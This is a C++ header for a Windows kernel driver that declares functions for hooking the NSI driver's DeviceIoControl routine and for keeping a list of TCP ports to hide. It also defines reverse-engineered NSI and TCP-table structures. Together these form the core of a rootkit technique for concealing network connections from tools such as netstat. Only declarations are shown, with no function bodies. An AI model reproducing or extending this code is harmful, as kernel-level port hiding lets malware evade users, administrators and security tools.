#pragma once
#include <ntifs.h>
#include "FastMutex.h"
#include "AutoLock.h"

namespace NetworkHandler {
	NTSTATUS hookNsi();

	NTSTATUS unhookNsi();

	NTSTATUS hookedDeviceIoControl(PDEVICE_OBJECT  DeviceObject, PIRP  Irp);

	NTSTATUS hookedCompletionRoutine(PDEVICE_OBJECT  DeviceObject, PIRP  Irp, PVOID  Context);

	USHORT htons(USHORT a);

	void addHiddenPort(LIST_ENTRY* entry);

	void cleanHiddenPorts();

	bool shouldHidePort(USHORT port);

	extern "C" NTSYSAPI NTSTATUS NTAPI ObReferenceObjectByName(
		PUNICODE_STRING ObjectName,
		ULONG Attributes,
		PACCESS_STATE AccessState,
		ACCESS_MASK DesiredAccess,
		POBJECT_TYPE ObjectType,
		KPROCESSOR_MODE AccessMode,
		PVOID ParseContext OPTIONAL,
		PVOID * Object
	);

	extern "C" POBJECT_TYPE * IoDriverObjectType;

	extern PDRIVER_OBJECT pNsiDriverObject;
	extern PDRIVER_DISPATCH originalNsiDeviceIo;

	struct HiddenPort
	{
		LIST_ENTRY Entry;
		USHORT HiddenPort;
	};

	typedef struct _HIDDEN_PORTS {
		LIST_ENTRY HiddenPortsHead;
		int HiddenPortsCount;
		FastMutex Mutex;
	} HIDDEN_PORTS, *PHIDDERN_PORTS;

	extern HIDDEN_PORTS HiddenPortsContext;

	constexpr int MAX_HIDDEN_PORTS = 256;

	constexpr ULONG  IOCTL_NSI_GETALLPARAM = 0x12001B;

	typedef unsigned long DWORD;

	constexpr int TCP = 0x38;

	typedef struct _NSI_STATUS_ENTRY
	{
		DWORD dwState;
		DWORD Unknown1;
	}NSI_STATUS_ENTRY, * PNSI_STATUS_ENTRY;

	typedef struct _NSI_PARAM
	{
		ULONG_PTR UnknownParam1;
		ULONG_PTR UnknownParam2;
		ULONG_PTR UnknownParam3;
		ULONG_PTR UnknownParam4;
		ULONG_PTR UnknownParam5;
		ULONG_PTR lpMem;
		ULONG_PTR Protocol; // 0x38 Tcp or 0x1c Udp
		ULONG_PTR UnknownParam8;
		ULONG_PTR UnknownParam9;
		ULONG_PTR lpStatus;
		ULONG_PTR UnknownParam11;
		ULONG_PTR UnknownParam12; //Process info
		ULONG_PTR UnknownParam13;
		ULONG_PTR ConnectionCount;
	}NSI_PARAM, * PNSI_PARAM;

	typedef struct _HP_CONTEXT
	{
		PIO_COMPLETION_ROUTINE oldIocomplete;
		PVOID oldCtx;
		BOOLEAN bShouldInvolve;
		PKPROCESS pcb;
	} HP_CONTEXT, * PHP_CONTEXT;

	typedef struct _INTERNAL_TCP_TABLE_SUBENTRY
	{
		USHORT Unknown1;
		USHORT Port;
		DWORD dwIP;
		UCHAR Unknown2[20];
	}INTERNAL_TCP_TABLE_SUBENTRY, * PINTERNAL_TCP_TABLE_SUBENTRY;

	typedef struct _INTERNAL_TCP_TABLE_ENTRY
	{
		INTERNAL_TCP_TABLE_SUBENTRY localEntry;
		INTERNAL_TCP_TABLE_SUBENTRY remoteEntry;
	} INTERNAL_TCP_TABLE_ENTRY, * PINTERNAL_TCP_TABLE_ENTRY;

}